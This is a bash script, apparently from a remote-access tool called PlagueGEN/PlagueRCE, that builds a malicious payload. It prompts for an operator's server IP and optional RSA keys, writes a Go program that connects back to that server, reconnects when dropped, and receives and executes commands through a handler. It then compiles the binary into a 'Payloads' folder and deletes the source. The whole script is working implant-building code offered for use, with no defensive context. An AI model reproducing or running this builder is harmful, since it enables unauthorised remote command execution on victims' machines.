#!/bin/bash

# Prompt user for server IP address
read -p "Enter the server IP address: " server_ip
echo "server_ip: $server_ip"

# Prompt user for encryption mode
read -p "Do you want to use encryption mode? [y]: " use_encryption

# Check if encryption mode is enabled
if [ "$use_encryption" == "y" ]; then
   
    echo "Encryption mode selected"
    echo "Insert 4096 bit RSA public key (terminate with Ctrl+D when done):"
    IFS= read -r -d '' public_key

    echo "Insert 4096 bit RSA private key (terminate with Ctrl+D when done):"
    IFS= read -r -d '' private_key

    # Generate Go main.go file
    cat <<EOF > Code/main.go
package main

import (
	"net"
	"packages/PlagueGEN/Code/packages" // Import my local packages
	"runtime"
	"strings"
)

func main() {
	// Hardcoded RSA public key
	const public_key string = `
$public_key
`
	// Hardcoded RSA private key
	const private_key string = `
$private_key
`
	// Format RSA keys properly
	// Remove leading and trailing whitespaces from RSA keys
	var formatted_public_key string = strings.TrimSpace(public_key)
	var formatted_private_key string = strings.TrimSpace(private_key)
	

	const server_address string = "$server_ip" // Server TCP/IP address
	const OSinfo string = runtime.GOOS                  // Get operating system information

	// Connect to PlagueRCE server
	conn, _ := packages.ConnectToServer(server_address)

	// Create a channel to notify the handler about the updated connection
	var conn_update chan *net.Conn = make(chan *net.Conn)

	// Start the goroutine to reconnect if disconnected from the internet
	done := make(chan struct{})
	go func() {
		packages.Reconnect(&conn, server_address, conn_update)
		close(done)
	}()

	defer conn.Close() // Close connection if there is a problem connecting

	// Start the handler to receive and execute commands
	packages.Handler_RSA(conn, OSinfo, formatted_private_key, formatted_public_key, conn_update)

}

EOF
    
else
    # Generate Go main.go file
    cat <<EOF > Code/main.go
package main

import (
    "net"
    "packages/PlagueGEN/Code/packages" // Import my local packages
    "runtime"
)

func main() {
    const server_address string = "$server_ip" // Server TCP/IP address
    const OSinfo string = runtime.GOOS        // Get operating system information

    // Connect to PlagueRCE server
    conn, _ := packages.ConnectToServer(server_address)

    // Create a channel to notify the handler about the updated connection
    var conn_update chan *net.Conn = make(chan *net.Conn)

    // Start the goroutine to reconnect if disconnected from the internet
    done := make(chan struct{})
    go func() {
        packages.Reconnect(&conn, server_address, conn_update)
        close(done)
    }()

    defer conn.Close() // Close connection if there is a problem connecting

    // Start the handler to receive and execute commands
    packages.Handler(conn, OSinfo, conn_update)
}
EOF
fi

# Compile Go code
go build -o Code/main Code/main.go

# Move executable to Payloads directory
mv Code/main Payloads/main

# Delete main.go from code directory
rm Code/main.go

echo "Go code compiled and executable moved to Payloads directory"